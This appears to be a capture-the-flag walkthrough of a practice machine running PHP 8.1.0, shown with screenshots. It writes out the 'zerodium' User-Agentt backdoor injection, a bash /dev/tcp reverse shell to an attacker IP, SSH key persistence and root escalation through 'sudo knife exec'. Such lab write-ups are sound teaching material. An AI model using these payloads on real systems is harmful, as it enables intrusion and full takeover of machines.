![knife](https://user-images.githubusercontent.com/66635295/183265217-40705451-47ef-47ea-ab35-e26165b77ea1.png)

**RECON**
---
**Medical Website** 

![recon](https://user-images.githubusercontent.com/66635295/185769120-78ab97a6-f512-4208-880a-3c05f2264f0d.png)

**Nmap Scan**

<pre>nmap -sC -sV 10.10.10.242</pre>

![nmap](https://user-images.githubusercontent.com/66635295/185769407-f6fd4c5b-cc7c-4ab8-b531-6e88f3b1e6bd.png)

**PHP Website**

![php site](https://user-images.githubusercontent.com/66635295/185770395-1da8cbb3-7ce3-4c36-8c2e-8103db704f6c.png)

Inspecting Network Properties reveals PHP 8.1.0

![php8](https://user-images.githubusercontent.com/66635295/185770435-9126406a-dd13-418f-87da-95be53733ccf.png)

**PHP Exploit**
![exploit](https://user-images.githubusercontent.com/66635295/185770641-fa1b43d7-afe9-4069-851a-d3b633694832.png)

![exploit info](https://user-images.githubusercontent.com/66635295/185770464-7a2eba76-ab51-4165-b925-18a0448de67f.png)

**ENUMERATION**
---
**Netcat listner**

<pre>nc -lvnp 80</pre>

![nc](https://user-images.githubusercontent.com/66635295/185774526-17ee8bd6-3db1-44cd-961f-4246e53ce9d5.png)

**Burp Repeater**

<pre> User-Agentt: zerodiumsystem('usr/bin/curl 10.10.14.4'); </pre>

![zerodium](https://user-images.githubusercontent.com/66635295/185774591-d979f520-60a7-43d4-b42d-3e1b4f9eea04.png)

**Curl Success**

![curld](https://user-images.githubusercontent.com/66635295/185774707-6bb92e13-f96f-4dce-9302-b157f3ea6507.png)

**Open second listner**

<pre>nc -lvnp 4444</pre>

![n4444](https://user-images.githubusercontent.com/66635295/185774762-588516b5-2335-43dc-83d6-177614124790.png)

**Reverse Shell**

<pre> User-Agentt: zerodiumsystem("bash -c 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'"); </pre>
![exp](https://user-images.githubusercontent.com/66635295/186058741-eaada558-b00d-4d72-a16d-3d7e0618fb7e.png)

Success user James

![user](https://user-images.githubusercontent.com/66635295/186058835-fd598d88-d291-4537-8a23-226e7ea0877e.png)

**TTY shell**
<pre>python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>
<pre>Ctrl+Z</pre> 
<pre>stty raw -echo;fg</pre>
<pre>press ENTER twice</pre>
<pre>export TERM=xterm</pre>

![xterm](https://user-images.githubusercontent.com/66635295/186064277-50b9bb5e-65f1-4e6b-af0f-4bac3c376050.png)

 
 **User Flag**
 
 ![usertxt](https://user-images.githubusercontent.com/66635295/186064336-1ed26612-49d6-4314-91f4-48fa756b59fa.png)

 
**PRIVILEGE ESCALATION**
---

**SSH Direcotry RSA Key**

<pre>cd .ssh</pre>

<pre>ls</pre>

![rsa](https://user-images.githubusercontent.com/66635295/186064600-f74129ed-7278-44dc-9035-024c3a55ee65.png)

**Send it to authorized keys**

<pre>cat id_rsa.pub > authorized_keys</pre>

![authkey](https://user-images.githubusercontent.com/66635295/186064400-772380d7-e0a1-4100-8e6e-de8be06aa59b.png)

**Copy Paste to Local Machine**

<pre>nano id_rsa</pre>

![copyrsa](https://user-images.githubusercontent.com/66635295/186064981-d5de681d-85df-41da-b8d8-c70816cfeb31.png)

<pre>chmod 600 id_ra</pre>

![chmod](https://user-images.githubusercontent.com/66635295/186065148-3b4a6afd-9b49-43c9-aa52-a73a989c88c6.png)

**SSH**
<pre>ssh -i id_rsa james@10.10.10.242</pre>

![box](https://user-images.githubusercontent.com/66635295/186065330-b650498b-f8d5-4439-a45e-176c5be54e99.png)

**Sudo Commands**

Running Chef

![knifed](https://user-images.githubusercontent.com/66635295/186065540-3f505176-f118-49b4-b23f-e461aec19820.png)

**Knife Command**

![exec](https://user-images.githubusercontent.com/66635295/186065724-2e9d462d-181f-40e3-b798-a5888fcb03a7.png)

**GTFO Bins**

Bypasses Security

![gtfobin](https://user-images.githubusercontent.com/66635295/186065991-953c6e8f-de9d-4b65-b7f2-c466c48318a8.png)

![kniffe](https://user-images.githubusercontent.com/66635295/186066012-c400b774-2a9a-4f0f-b76c-4503d4c6c0f4.png)

<pre>sudo knife exec -E 'exec "/bin/sh"'</pre>
![cmd](https://user-images.githubusercontent.com/66635295/186066142-151412b4-f663-4e2c-9745-2f59a7dd51b4.png)

**ROOT Flag**

<pre>id</pre>

![rooted](https://user-images.githubusercontent.com/66635295/186066255-0802e500-0488-4aef-b203-bc2e7baa1b67.png)

<pre>cd root</pre>

<pre>ls</pre>

![rooot](https://user-images.githubusercontent.com/66635295/186066369-efb111c8-fed5-4f0c-ad13-51b4a84c9d21.png)



